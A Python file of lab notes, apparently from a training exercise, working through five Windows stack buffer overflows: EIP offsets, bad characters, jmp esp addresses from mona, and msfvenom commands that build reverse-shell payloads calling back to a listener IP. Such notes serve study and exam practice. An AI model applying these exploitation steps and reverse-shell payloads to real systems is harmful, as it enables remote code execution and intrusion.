#!/bin/python3

import binascii
from utils import *

# --------------------------------------------------------------------------------------

# Steps
# 1. fuzzing with fuzzer.py

# 2. pattern_create with metasploit 

# 3. find EIP: !mona findmsp -distance <N of bits>

# 4. find the ESP address

# 5. find badchars: !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP>

# 6. find jumps: !mona jmp -r esp -cpb <bad chars>

# 7. create RevShell payload

# --------------------------------------------------------------------------------------

'''

* OVERFLOW 1:

* EIP contains normal pattern : 0x6f43396e (offset 1978)
* ESP : 0x018CFA30

* BadChars: \x00\x07\x08\x2e\x2f\xa0\xa1

'''

generate_bytearray()
print()

# ------
# !mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"

'''
625011AF     0x625011af : jmp esp | 
625011BB     0x625011bb : jmp esp | 
625011C7     0x625011c7 : jmp esp | 
625011D3     0x625011d3 : jmp esp | 
625011DF     0x625011df : jmp esp | 
625011EB     0x625011eb : jmp esp | 
625011F7     0x625011f7 : jmp esp | 
62501203     0x62501203 : jmp esp |
62501205     0x62501205 : jmp esp |

'''

print('OVERFLOW1 retn Address:')
hex2bytes("625011BB")

# Generate Payload
# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c

# ----------------------------------------------------------------------------------------

## OVERFLOW 2

# Crashed on 700 bytes

# EIP address: 76413176
# Offset: 634
# Message=    EIP contains normal pattern : 0x76413176 (offset 634)

# ESP address: 0x0189FA30
# BadChars=00 23 24 3c 3d 83 84 ba bb
# \x00\x23\x24\x3c\x3d\x83\x84\xba\xbb

# New ESP after removing the bad chars
# ESP: 0195FA30 

# jumps
# 625011AF     0x625011af : jmp esp 
# 625011C7     0x625011c7 : jmp esp 
# 625011D3     0x625011d3 : jmp esp 
# 625011DF     0x625011df : jmp esp 
# 625011EB     0x625011eb : jmp esp 
# 625011F7     0x625011f7 : jmp esp 
# 62501203     0x62501203 : jmp esp 
# 62501205     0x62501205 : jmp esp 

print("OVERFLOW 2: retn Address")
hex2bytes("625011AF")

# Generate RevShell 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb" -f c

# ----------------------------------------------------------------------------------------

## OVERFLOW 3

# Fuzzing crashed at 1300 bytes

# EIP contains normal pattern : 0x35714234 (offset 1274)
# ESP : 01B0FA30
# Bad chars: 11 12 40 41 5f 60 b8 b9 ee ef
# \x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef

# New ESP: 0x01A2FA30
# !mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"

# Result:
# 0x62501203 : jmp esp |
# 0x62501205 : jmp esp |

print("OVERFLOW3 Address")
hex2bytes("62501205")

# Generate RevShell 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef" -f c

# ------------------------------------------------------------------------------------------------------------------------------------------

## Overflow 4

# Fuzzing crashed at 2100 bytes

# EIP contains normal pattern : 0x70433570 (offset 2026)
# ESP: 0x019EFA30
# Bad chars: 00 a9 aa cd ce d4 d5
# \x00\xa9\xaa\xcd\xce\xd4\xd5

# New ESP: 0x0192FA30
# !mona jmp -r esp -cpb "\x00\xa9\xaa\xcd\xce\xd4\xd5"

# Result
#  625011AF     0x625011af : jmp esp |
#  625011BB     0x625011bb : jmp esp |
#  625011C7     0x625011c7 : jmp esp |
#  625011D3     0x625011d3 : jmp esp |
#  625011DF     0x625011df : jmp esp |
#  625011EB     0x625011eb : jmp esp |
#  625011F7     0x625011f7 : jmp esp |
#  62501203     0x62501203 : jmp esp |
#  62501205     0x62501205 : jmp esp |

print("OVERFLOW4")
hex2bytes("625011AF")

# --------------------------------------------------------------------------------------

# Using the method as before we answer the rest of the tasks
#......

# --------------------------------------------------------------------------------------
## OVERFLOW 5

# EIP contains normal pattern : 0x356b4134 (offset 314)
# ESP: 0x01A6FA30
# Bad chars: 00 16 17 2f 30 f4 f5 fd
# \x00\x16\x17\x2f\x30\xf4\xf5\xfd

# New ESP: 0x019BFA30

# find jumps

# !mona jmp -r esp -cpb \x00\x16\x17\x2f\x30\xf4\xf5\xfd
# 0x625011af : jmp esp |
print("OVERFLOW5")
hex2bytes("625011af")

# Generate RevShell
# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x16\x17\x2f\x30\xf4\xf5\xfd" -f c


# --------------------------------------------------------------------------------------

# Steps
# 1. fuzzing with fuzzer.py

# 2. pattern_create with metasploit 

# 3. find EIP: !mona findmsp -distance <N of bits>

# 4. find the ESP address

# 5. find badchars: !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP>

# 6. find jumps: !mona jmp -r esp -cpb <bad chars>

# 7. create RevShell payload

# --------------------------------------------------------------------------------------
